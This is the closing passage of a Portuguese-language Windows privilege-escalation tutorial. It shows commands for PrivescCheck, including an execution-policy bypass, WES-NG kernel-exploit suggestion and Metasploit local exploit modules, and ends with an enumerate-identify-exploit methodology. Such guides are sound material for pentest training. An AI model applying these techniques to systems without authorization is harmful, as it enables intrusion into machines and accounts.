- **PrivescCheck:** Um script do PowerShell que faz uma enumeração abrangente.

```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

- **WES-NG (Windows Exploit Suggester - Next Generation):** Ferramenta que, com base na saída do comando `systeminfo`, sugere possíveis exploits para o kernel do Windows.

```bash
# No Windows (como usuário comum)
systeminfo > systeminfo.txt
```

```bash
# No Kali
python wes.py systeminfo.txt
```

- **Metasploit:** O framework Metasploit possui módulos de pós-exploração e exploits para muitas das técnicas descritas, como `exploit/windows/local/service_permissions` ou módulos específicos para `AlwaysInstallElevated`.

---
## Conclusão

Este guia percorreu as principais vias de escalação de privilégios em sistemas Windows. Aprendemos que a escalação não depende apenas de exploits de kernel, mas, na maioria das vezes, de **configurações incorretas e más práticas de administração**. Desde a simples descoberta de senhas em arquivos até o abuso de privilégios intrínsecos como `SeBackupPrivilege`, cada técnica exige um entendimento claro do funcionamento interno do Windows.

Lembre-se da metodologia:

1. **Enumere:** Descubra o máximo de informação possível sobre o sistema, usuários, serviços e permissões. Ferramentas como WinPEAS automatizam isso.
2. **Identifique o Vetor:** Com base na enumeração, identifique um ou mais caminhos promissores (um serviço modificável, um privilégio abusável, uma credencial exposta).
3. **Pesquise e Explore:** Com o vetor em mãos, pesquise a técnica específica (como neste guia) e aplique a exploração.
